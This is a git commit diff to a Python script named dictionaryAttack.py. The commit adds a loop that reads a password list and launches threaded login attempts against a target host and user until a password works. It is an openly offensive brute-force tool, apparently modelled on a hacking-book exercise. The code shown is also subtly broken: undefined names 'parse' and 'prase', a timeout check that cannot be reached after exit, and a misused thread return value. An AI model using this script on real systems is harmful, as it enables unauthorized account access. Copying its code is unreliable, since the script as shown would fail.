3b2b8b7ad6573ca23fd127ffc63182745fa086df
mr-fool <mr-fool@users.noreply.github.com>
2021-08-10 21:07:57 +0800

    Update dictionaryAttack.py

--- dictionaryAttack.py
+++ dictionaryAttack.py
@@ -26,10 +26,11 @@ def connect(host, user, password, release):
             time.sleep(1)
             connect(host, user, password, False)
     finally:
-        if release: connection_lock.release():
+        if release: 
+            connection_lock.release()
 
 def main():
-    parser  = optparse.Optionparser('usage %prog - H <target host> -u <user> -F <password list>')
+    parser  = optparse.OptionParser('usage %prog - H <target host> -u <user> -F <password list>')
     parse.add_option('-H', dest = 'tgHost', type= "string", help = 'specify target host')
     prase.add_option('-F', dest = 'passwdFile', type = "string", help = 'specify password file')
     prase.add_option('-u', dest = 'user', type = "string", help = 'specify the user')
@@ -41,8 +42,25 @@ def main():
 
     if host == None or passwdFile == None or user == None :
         print ( parser.usage)
-        exit() 
+        exit(0) 
+    fn = open(passwdFile, 'r')
+    
+    for line in fn.readlines():
+        if Found:
+            print('[*] Existing: password found' )
+            exit(0)
+            if Fails > 5 :
+                print('[!] Existing: Too many socket timeouts')
+                exit(0)
+        connection_lock.acquire()
+        password = line.strip('\r').strip('\n')
+        print('[-] testing: ' + str(password) )
+        t = Thread(target = connect, args =  (host, user, password, True) )
+        child = t.start()
 
+if __name__ == "__main__":
+	main()
+	
 
 
         
